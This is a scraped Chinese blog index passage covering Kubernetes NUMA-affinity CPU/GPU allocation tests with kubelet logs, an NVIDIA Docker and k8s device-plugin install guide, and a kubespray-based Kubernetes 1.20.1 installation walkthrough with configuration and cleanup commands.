15:13:13.741037 117175 scope_container.go:88] [topologymanager] ContainerTopologyHint: {01 true} Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.741054 117175 scope_container.go:53] [topologymanager] Best TopologyHint for (pod: 16cpu-numa-batch-pod_default(9388acc6-a396-4f03-a353-ce153da46aaf) container: app): {01 true} Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.741072 117175 scope_container.go:63] [topologymanager] Topology Affinity for (pod: 16cpu-numa-batch-pod_default(9388acc6-a396-4f03-a353-ce153da46aaf) container: app): {01 true} Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.743378 117175 policy_static.go:221] [cpumanager] static policy: Allocate (pod: 16cpu-numa-batch-pod_default(9388acc6-a396-4f03-a353-ce153da46aaf), container: app) Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.743418 117175 policy_static.go:232] [cpumanager] Pod 16cpu-numa-batch-pod_default(9388acc6-a396-4f03-a353-ce153da46aaf), Container app Topology Affinity is: {01 true} Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.743448 117175 policy_static.go:259] [cpumanager] allocateCpus: (numCPUs: 16, socket: 01) Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.743841 117175 state_mem.go:88] [cpumanager] updated default cpuset: \u0026#34;0,20-27\u0026#34; Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.744701 117175 policy_static.go:294] [cpumanager] allocateCPUs: returning \u0026#34;1-13,17-19\u0026#34; Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.744761 117175 state_mem.go:80] [cpumanager] updated desired cpuset (pod: 9388acc6-a396-4f03-a353-ce153da46aaf, container: app, cpuset: \u0026#34;1-13,17-19\u0026#34;)   GPU某numa组资源不足 启动2个pod\n pod1：请求1个GPU，3个cpu 占有numa组1 pod2：请求2个GPU，0个cpu  pod2 [08b4a90a-534a-4fc6-90c3-b57ee777071d]的2个GPU分配到了numa组0和1，在best-effort策略下，虽不满足numa亲和性，但仍按系统可用资源进行分配\n1 2 3 4 5 6 7  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0-13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:2485662466}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;08b4a90a-534a-4fc6-90c3-b57ee777071d\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;0\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;],\u0026#34;1\u0026#34;:[\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CmsKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSUUdQVS05YjM0MWM1OS1mOTZiLWJhODUtYzEzNy03OGMzNjUyZmVhNjUsR1BVLTc3YTcwMmRiLWUzN2YtM2E3NC1kNDZkLWM1NzEzZjY2MDU4YxokCg4vZGV2L252aWRpYWN0bBIOL2Rldi9udmlkaWFjdGwaAnJ3GiYKDy9kZXYvbnZpZGlhLXV2bRIPL2Rldi9udmlkaWEtdXZtGgJydxoyChUvZGV2L252aWRpYS11dm0tdG9vbHMSFS9kZXYvbnZpZGlhLXV2bS10b29scxoCcncaLgoTL2Rldi9udmlkaWEtbW9kZXNldBITL2Rldi9udmlkaWEtbW9kZXNldBoCcncaIAoML2Rldi9udmlkaWEwEgwvZGV2L252aWRpYTAaAnJ3GiAKDC9kZXYvbnZpZGlhMRIML2Rldi9udmlkaWExGgJydw==\u0026#34;},{\u0026#34;PodUID\u0026#34;:\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:3342579237}[root@node2 kubelet]#   拓扑管理器的策略分配结果，如下，不满足numa亲和性。\n1 2 3  Dec 29 14:50:05 node2 kubelet[117175]: I1229 14:50:05.825370 117175 scope_container.go:80] [topologymanager] TopologyHints for pod \u0026#39;2gpu-numa-batch-pod_default(08b4a90a-534a-4fc6-90c3-b57ee777071d)\u0026#39;, container \u0026#39;app\u0026#39;: map[] Dec 29 14:50:05 node2 kubelet[117175]: I1229 14:50:05.825386 117175 policy.go:70] [topologymanager] Hint Provider has no preference for NUMA affinity with any resource Dec 29 14:50:05 node2 kubelet[117175]: I1229 14:50:05.825403 117175 scope_container.go:88] [topologymanager] ContainerTopologyHint: {11 false}   GPU和cpu numa组资源都不满足 启动2个pod\n pod1：请求1个GPU，3个cpu 占有numa组1 pod2：请求2个GPU，16个cpu  pod2 [27a7e589-4c5e-4c47-813e-be1a118d3d80] 的cpu分配到了2个numa组，GPU也同样分配到了2个numa组，不满足numa亲和性了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0-13,17-27\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:2485662466}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\u0026#34;Data\u0026#34;:{\u0026#34;PodDeviceEntries\u0026#34;:[{\u0026#34;PodUID\u0026#34;:\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;1\u0026#34;:[\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\u0026#34;},{\u0026#34;PodUID\u0026#34;:\u0026#34;27a7e589-4c5e-4c47-813e-be1a118d3d80\u0026#34;,\u0026#34;ContainerName\u0026#34;:\u0026#34;app\u0026#34;,\u0026#34;ResourceName\u0026#34;:\u0026#34;nvidia.com/gpu\u0026#34;,\u0026#34;DeviceIDs\u0026#34;:{\u0026#34;0\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;],\u0026#34;1\u0026#34;:[\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;]},\u0026#34;AllocResp\u0026#34;:\u0026#34;CmsKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSUUdQVS03N2E3MDJkYi1lMzdmLTNhNzQtZDQ2ZC1jNTcxM2Y2NjA1OGMsR1BVLTliMzQxYzU5LWY5NmItYmE4NS1jMTM3LTc4YzM2NTJmZWE2NRokCg4vZGV2L252aWRpYWN0bBIOL2Rldi9udmlkaWFjdGwaAnJ3GiYKDy9kZXYvbnZpZGlhLXV2bRIPL2Rldi9udmlkaWEtdXZtGgJydxoyChUvZGV2L252aWRpYS11dm0tdG9vbHMSFS9kZXYvbnZpZGlhLXV2bS10b29scxoCcncaLgoTL2Rldi9udmlkaWEtbW9kZXNldBITL2Rldi9udmlkaWEtbW9kZXNldBoCcncaIAoML2Rldi9udmlkaWEwEgwvZGV2L252aWRpYTAaAnJ3GiAKDC9kZXYvbnZpZGlhMRIML2Rldi9udmlkaWExGgJydw==\u0026#34;}],\u0026#34;RegisteredDevices\u0026#34;:{\u0026#34;nvidia.com/gpu\u0026#34;:[\u0026#34;GPU-77a702db-e37f-3a74-d46d-c5713f66058c\u0026#34;,\u0026#34;GPU-9b341c59-f96b-ba85-c137-78c3652fea65\u0026#34;,\u0026#34;GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\u0026#34;]}},\u0026#34;Checksum\u0026#34;:4286867880}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat cpu_manager_state {\u0026#34;policyName\u0026#34;:\u0026#34;static\u0026#34;,\u0026#34;defaultCpuSet\u0026#34;:\u0026#34;0,6-13\u0026#34;,\u0026#34;entries\u0026#34;:{\u0026#34;27a7e589-4c5e-4c47-813e-be1a118d3d80\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;1-5,17-27\u0026#34;},\u0026#34;f21fe02b-e6e2-4d04-9a4a-9e57367fa324\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;14-16\u0026#34;}},\u0026#34;checksum\u0026#34;:3981361486}[root@node2 kubelet]# [root@node2 kubelet]#   拓扑管理器的策略分配结果，如下，不满足numa亲和性。\n1 2 3 4 5 6 7 8 9 10 11 12 13  Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.719228 117175 topology_manager.go:187] [topologymanager] Topology Admit Handler Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.719322 117175 scope_container.go:80] [topologymanager] TopologyHints for pod \u0026#39;16cpu-2gpu-numa-kubebatch-pod_default(27a7e589-4c5e-4c47-813e-be1a118d3d80)\u0026#39;, container \u0026#39;app\u0026#39;: map[nvidia.com/gpu:[{11 false}]] Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.719555 117175 policy_static.go:379] [cpumanager] TopologyHints generated for pod \u0026#39;16cpu-2gpu-numa-kubebatch-pod_default(27a7e589-4c5e-4c47-813e-be1a118d3d80)\u0026#39;, container \u0026#39;app\u0026#39;: [{11 true}] Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.719581 117175 scope_container.go:80] [topologymanager] TopologyHints for pod \u0026#39;16cpu-2gpu-numa-kubebatch-pod_default(27a7e589-4c5e-4c47-813e-be1a118d3d80)\u0026#39;, container \u0026#39;app\u0026#39;: map[cpu:[{11 true}]] Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.719605 117175 scope_container.go:88] [topologymanager] ContainerTopologyHint: {11 false} Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.719622 117175 scope_container.go:53] [topologymanager] Best TopologyHint for (pod: 16cpu-2gpu-numa-kubebatch-pod_default(27a7e589-4c5e-4c47-813e-be1a118d3d80) container: app): {11 false} Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.719639 117175 scope_container.go:63] [topologymanager] Topology Affinity for (pod: 16cpu-2gpu-numa-kubebatch-pod_default(27a7e589-4c5e-4c47-813e-be1a118d3d80) container: app): {11 false} Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.721990 117175 policy_static.go:221] [cpumanager] static policy: Allocate (pod: 16cpu-2gpu-numa-kubebatch-pod_default(27a7e589-4c5e-4c47-813e-be1a118d3d80), container: app) Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.722024 117175 policy_static.go:232] [cpumanager] Pod 16cpu-2gpu-numa-kubebatch-pod_default(27a7e589-4c5e-4c47-813e-be1a118d3d80), Container app Topology Affinity is: {11 false} Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.722052 117175 policy_static.go:259] [cpumanager] allocateCpus: (numCPUs: 16, socket: 11) Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.722773 117175 state_mem.go:88] [cpumanager] updated default cpuset: \u0026#34;0,6-13\u0026#34; Dec 29 15:37:43 node2 kubelet[117175]: I1229 15:37:43.723694 117175 policy_static.go:294] [cpumanager] allocateCPUs: returning \u0026#34;1-5,17-27\u0026#34;   附录 kubelet numa拓扑亲和性资源分配方案： Kubernetes Topology Manager Moves to Beta - Align Up!\n测试pod 配置 16cpu-2gpu-numa-kubebatch-pod.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  apiVersion:v1kind:Podmetadata:name:16cpu-2gpu-numa-kubebatch-podlabels:app:myappversion:v1spec:schedulerName:kube-batchcontainers:- name:appimage:docker.io/busybox:latestimagePullPolicy:IfNotPresentcommand:[\u0026#34;sleep\u0026#34;,\u0026#34;3600\u0026#34;]securityContext:privileged:trueresources:limits:cpu:\u0026#34;16\u0026#34;memory:\u0026#34;100Mi\u0026#34;nvidia.com/gpu:2requests:cpu:\u0026#34;16\u0026#34;memory:\u0026#34;100Mi\u0026#34;nvidia.com/gpu:2affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:- matchExpressions:- key:node-role.kubernetes.io/nodeoperator:NotInvalues:- \u0026#34;true\u0026#34;  ","permalink":"http://bingerambo.com/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试"},{"categories":["K8S"],"contents":"Centos 7环境下，安装NVIDIA Container和K8S的GPU插件的操作命令\n  Setting up NVIDIA Container Toolkit\nNVIDIA Docker参考NVIDIA官网教程\nNVIDIA Container Toolkit 官方安装说明\n  NVIDIA k8s-device-plugin 参考项目地址\nk8s-device-plugin\n  NVIDIA Docker依赖 1 2 3 4 5 6 7 8 9 10 11  sudo yum install -y tar bzip2 make automake gcc gcc-c++ vim pciutils elfutils-libelf-devel libglvnd-devel iptables ### Setup the official Docker CE repository: sudo yum-config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo ### Now you can observe the packages available from the docker-ce repo: sudo yum repolist -v #### 生成yum缓存  sudo yum makecache   NVIDIA Docker2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ### Clear installed old version package # rpm -qa|grep nvidia # yum info installed |grep nvidia sudo yum remove -y nvidia-docker sudo yum remove -y nvidia-docker2 ## 如果原有版本使用rpm方式安装，则清理rpm包 rpm -qa|grep nvidia |grep -E \u0026#34;libnvidia-container|nvidia-container-runtime\u0026#34; |xargs rpm -e ### Setup the stable repository and the GPG key: distribution=$(. /etc/os-release;echo $ID$VERSION_ID) \\  \u0026amp;\u0026amp; curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.repo | sudo tee /etc/yum.repos.d/nvidia-docker.repo sudo yum clean expire-cache ### 生成yum缓存  #sudo yum makecache  sudo yum install -y nvidia-docker2 ### Restart the Docker daemon to complete the installation after setting the default runtime: sudo systemctl restart docker   验证 1 2  ### t this point, a working setup can be tested by running a base CUDA container: sudo docker run --rm --gpus all nvidia/cuda:11.0-base nvidia-smi   安装成功，如下结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.80.02 Driver Version: 450.80.02 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla P100-PCIE... Off | 00000000:3B:00.0 Off | Off | | N/A 37C P0 33W / 250W | 0MiB / 16280MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla P100-PCIE... Off | 00000000:86:00.0 Off | Off | | N/A 37C P0 32W / 250W | 0MiB / 16280MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla P100-PCIE... Off | 00000000:D8:00.0 Off | Off | | N/A 36C P0 27W / 250W | 0MiB / 16280MiB | 4% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+   NVIDIA K8S Device plugin 这里使用镜像方式，更多方式，参考k8s-device-plugin\n拉取镜像 1 2  docker pull nvidia/k8s-device-plugin:v0.7.3 docker tag nvidia/k8s-device-plugin:v0.7.3 nvidia/k8s-device-plugin:devel   运行镜像 以下方式2选1：\nWithout compatibility for the CPUManager static policy:\n1 2 3 4 5 6 7  docker run \\  -it \\  --security-opt=no-new-privileges \\  --cap-drop=ALL \\  --network=none \\  -v /var/lib/kubelet/device-plugins:/var/lib/kubelet/device-plugins \\  nvidia/k8s-device-plugin:devel   With compatibility for the CPUManager static policy:\n1 2 3 4 5 6  docker run \\  -it \\  --privileged \\  --network=none \\  -v /var/lib/kubelet/device-plugins:/var/lib/kubelet/device-plugins \\  nvidia/k8s-device-plugin:devel --pass-device-specs   附录 手动安装nvidia-docker(在有外网机器上面进行)， 未测试验证，仅供参考\n1 2 3 4 5 6 7 8 9  distribution=$(. /etc/os-release;echo $ID$VERSION_ID) curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.repo | sudo tee /etc/yum.repos.d/nvidia-docker.repo yum install --downloadonly nvidia-docker2 --downloaddir=/tmp/nvidia ##在拷贝到没有网路的服务器上面执行以下命令 rpm -ivh libnvidia-container1-1.1.1-1.x86_64.rpm libnvidia-container-tools-1.1.1-1.x86_64.rpm rpm -ivh nvidia-container-runtime-3.2.0-1.x86_64.rpm nvidia-container-toolkit-1.1.2-2.x86_64.rpm   ","permalink":"http://bingerambo.com/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件"},{"categories":["K8S"],"contents":"上周末k8s刚刚发布了1.20.1版本，抢鲜安装体验下。\n 由于网络原因，访问谷歌外网不是很方便，所以本文采用国内可访问的资源进行安装，资源包括：k8s二进制文件和镜像文件 安装方式采用kubespray，项目地址  k8s版本包 k8s社区版本发布地址如下\nhttps://storage.googleapis.com/kubernetes-release/release/ 分别有server、node、client三种版本包二进制文件。下载方式如下：\n1 2 3 4 5 6 7 8 9  wget https://storage.googleapis.com/kubernetes-release/release/v1.20.1/kubernetes-server-linux-amd64.tar.gz wget https://storage.googleapis.com/kubernetes-release/release/v1.20.1/kubernetes-node-linux-amd64.tar.gz wget https://storage.googleapis.com/kubernetes-release/release/v1.20.1/kubernetes-client-linux-amd64.tar.gz   上面这些地址无法直接访问。可以改由下面方式下载：\n通过 CHANGELOG-1.20里面的指定的位置，下载指定版本 如1.12.1\n实际上，对于安装部署，只要node中的版本包即可。\n1  wget https://storage.googleapis.com/kubernetes-release/release/v1.20.1/kubernetes-node-linux-amd64.tar.gz   kubespray 说明 安装脚本采用kubespray，本文使用了目前最新的release版本1.14.2\nkubespray-1.14.2 只支持到了k8s1.19，所以后面我们需要修改kubespray。 首先看下kubespray关于离线安装的事项说明\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  如果采用离线方式安装 Configure Inventory Once all artifacts are accessible from your internal network, adjust the following variables in your inventory to match your environment: # Registry overrides gcr_image_repo: \u0026#34;{{ registry_host }}\u0026#34; docker_image_repo: \u0026#34;{{ registry_host }}\u0026#34; quay_image_repo: \u0026#34;{{ registry_host }}\u0026#34; kubeadm_download_url: \u0026#34;{{ files_repo }}/kubernetes/{{ kube_version }}/kubeadm\u0026#34; kubectl_download_url: \u0026#34;{{ files_repo }}/kubernetes/{{ kube_version }}/kubectl\u0026#34; kubelet_download_url: \u0026#34;{{ files_repo }}/kubernetes/{{ kube_version }}/kubelet\u0026#34; # etcd is optional if you **DON\u0026#39;T** use etcd_deployment=host etcd_download_url: \u0026#34;{{ files_repo }}/kubernetes/etcd/etcd-{{ etcd_version }}-linux-amd64.tar.gz\u0026#34; cni_download_url: \u0026#34;{{ files_repo }}/kubernetes/cni/cni-plugins-linux-{{ image_arch }}-{{ cni_version }}.tgz\u0026#34; crictl_download_url: \u0026#34;{{ files_repo }}/kubernetes/cri-tools/crictl-{{ crictl_version }}-{{ ansible_system | lower }}-{{ image_arch }}.tar.gz\u0026#34; # If using Calico calicoctl_download_url: \u0026#34;{{ files_repo }}/kubernetes/calico/{{ calico_ctl_version }}/calicoctl-linux-{{ image_arch }}\u0026#34; # CentOS/Redhat ## Docker docker_rh_repo_base_url: \u0026#34;{{ yum_repo }}/docker-ce/$releasever/$basearch\u0026#34; docker_rh_repo_gpgkey: \u0026#34;{{ yum_repo }}/docker-ce/gpg\u0026#34; ## Containerd extras_rh_repo_base_url: \u0026#34;{{ yum_repo }}/centos/$releasever/extras/$basearch\u0026#34; extras_rh_repo_gpgkey: \u0026#34;{{ yum_repo }}/containerd/gpg\u0026#34; # Fedora ## Docker docker_fedora_repo_base_url: \u0026#34;{{ yum_repo }}/docker-ce/{{ ansible_distribution_major_version }}/{{ ansible_architecture }}\u0026#34; docker_fedora_repo_gpgkey: \u0026#34;{{ yum_repo }}/docker-ce/gpg\u0026#34; ## Containerd containerd_fedora_repo_base_url: \u0026#34;{{ yum_repo }}/containerd\u0026#34; containerd_fedora_repo_gpgkey: \u0026#34;{{ yum_repo }}/docker-ce/gpg\u0026#34; # Debian ## Docker docker_debian_repo_base_url: \u0026#34;{{ debian_repo }}/docker-ce\u0026#34; docker_debian_repo_gpgkey: \u0026#34;{{ debian_repo }}/docker-ce/gpg\u0026#34; ## Containerd containerd_debian_repo_base_url: \u0026#34;{{ ubuntu_repo }}/containerd\u0026#34; containerd_debian_repo_gpgkey: \u0026#34;{{ ubuntu_repo }}/containerd/gpg\u0026#34; containerd_debian_repo_repokey: \u0026#39;YOURREPOKEY\u0026#39; # Ubuntu ## Docker docker_ubuntu_repo_base_url: \u0026#34;{{ ubuntu_repo }}/docker-ce\u0026#34; docker_ubuntu_repo_gpgkey: \u0026#34;{{ ubuntu_repo }}/docker-ce/gpg\u0026#34; ## Containerd containerd_ubuntu_repo_base_url: \u0026#34;{{ ubuntu_repo }}/containerd\u0026#34; containerd_ubuntu_repo_gpgkey: \u0026#34;{{ ubuntu_repo }}/containerd/gpg\u0026#34; containerd_ubuntu_repo_repokey: \u0026#39;YOURREPOKEY\u0026#39; # If using helm helm_stable_repo_url: \u0026#34;{{ helm_registry }}\u0026#34;   一些k8s组件程序文件，如 kubelet 保存路径如下: {{ local_release_dir }}/kubelet-{{ kube_version }}-{{ image_arch }}\nkubespray 安装   安装python3环境 参考脚本部署Python3\n  安装 ansible\n  1 2 3 4 5 6  pip3 install -r requirements.txt # 或者 # 临时指定python的pip源，进行安装 pip3 install -i https://pypi.douban.com/simple -r requirements.txt   自定义部署配置文件  1 2 3 4  # Copy ``inventory/sample`` as ``inventory/mycluster`` # cp -rfp inventory/sample inventory/mycluster cp -rfp inventory/sample inventory/deploy_cluster   接着对deploy_cluster和源码脚本进行可修改，详见下文\n执行kubespray安装或卸载  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # 这里我修改了自定义部署配置目录为 deploy_cluster， 并修改其中的配置参数 ansible-playbook -i inventory/deploy_cluster/inventory.ini --become --become-user=root cluster.yml -vvv # 卸载命令 ansible-playbook -i inventory/deploy_cluster/inventory.ini --become --become-user=root reset.yml -vvv ## 清理程序和文件目录 rm -rf /etc/kubernetes rm -rf /var/lib/kubelet rm -rf /etc/ssl/etcd rm -rf /var/lib/etcd rm -rf /usr/local/bin/kubectl rm -rf /etc/systemd/system/calico-node.service rm -rf /etc/systemd/system/kubelet.service rm -rf /etc/cni rm -rf /opt/cni rm -rf /var/lib/cni/cache rm -rf /etc/calico/certs systemctl stop etcd.service systemctl disable etcd.service systemctl stop calico-node.service systemctl disable calico-node.service docker stop $(docker ps -q) docker rm $(docker ps -a -q) service docker restart 卸载时 并没有清理/tmp/release，另外reset后再执行安装，会发现/usr/local/bin/下没有kubeadm，需要从安装目录把kubeadm拷贝过去   示例 aist_cluster环境安装和卸载\nansible版本 确认使用ansible2.9.6\n安装命令 1  /usr/local/python3/bin/ansible-playbook -i inventory/aist_cluster/inventory.ini --become --become-user=root cluster.yml -vvvvv   卸载命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  /usr/local/python3/bin/ansible-playbook -i inventory/aist_cluster/inventory.ini --become --become-user=root reset.yml -vvvvv ## 清理程序和文件目录 rm -rf /etc/kubernetes rm -rf /var/lib/kubelet rm -rf /etc/ssl/etcd rm -rf /var/lib/etcd rm -rf /usr/local/bin/kubectl #rm -rf /etc/systemd/system/calico-node.service #rm -rf /etc/systemd/system/kubelet.service rm -rf /etc/cni rm -rf /opt/cni rm -rf /var/lib/cni/cache rm -rf /etc/calico/certs   kubespray 修改 脚本修改 修改点说明\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ### 下载校验关闭 由于安装的是新版本1.20.原有kubespray并不支持，所以需要把其对二进制文件的下载校验关闭 把手动替换的几个程序文件的校验操作关闭 # kubeadm # sha256: \u0026#34;{{ kubeadm_binary_checksum }}\u0026#34; # sha256: \u0026#34;{{ kubelet_binary_checksum }}\u0026#34; # sha256: \u0026#34;{{ kubectl_binary_checksum }}\u0026#34;  ### 修改下载地址包括二进制文件和镜像  ### 已有下载文件的下载关闭 把 download tasks/main.yaml download | Get kubeadm binary and list of required images 注释掉   kubespray-2.14.2\\roles\\download\\defaults\\main.yaml\nlocal_release_dir:/tmp/releasesdownload_cache_dir:/tmp/kubespray_cache# do not delete remote cache files after using them# NOTE: Setting this parameter to TRUE is only really useful when developing kubespraydownload_keep_remote_cache:false# Only useful when download_run_once is false: Localy cached files and images are# uploaded to kubernetes nodes. Also, images downloaded on those nodes are copied# back to the ansible runner\u0026#39;s cache, if they are not yet preset.download_force_cache:false# Used to only evaluate vars from download roleskip_downloads:false# Optionally skip kubeadm images download#skip_kubeadm_images: falseskip_kubeadm_images:truekubeadm_images:{}# if this is set to true will only download files once. Doesn\u0026#39;t work# on Flatcar Container Linux by Kinvolk unless the download_localhost is true and localhost# is running another OS type. Default compress level is 1 (fastest).download_run_once:falsedownload_compress:1# if this is set to true will download containerdownload_container:true# if this is set to true, uses the localhost for download_run_once mode# (requires docker and sudo to access docker). You may want this option for# local caching of docker images or for Flatcar Container Linux by Kinvolk cluster nodes.# Otherwise, uses the first node in the kube-master group to store images# in the download_run_once mode.download_localhost:false# Always pull images if set to True. Otherwise check by the repo\u0026#39;s tag/digest.download_always_pull:false# Some problems may occur when downloading files over https proxy due to ansible bug# https://github.com/ansible/ansible/issues/32750. Set this variable to False to disable# SSL validation of get_url module. Note that kubespray will still be performing checksum 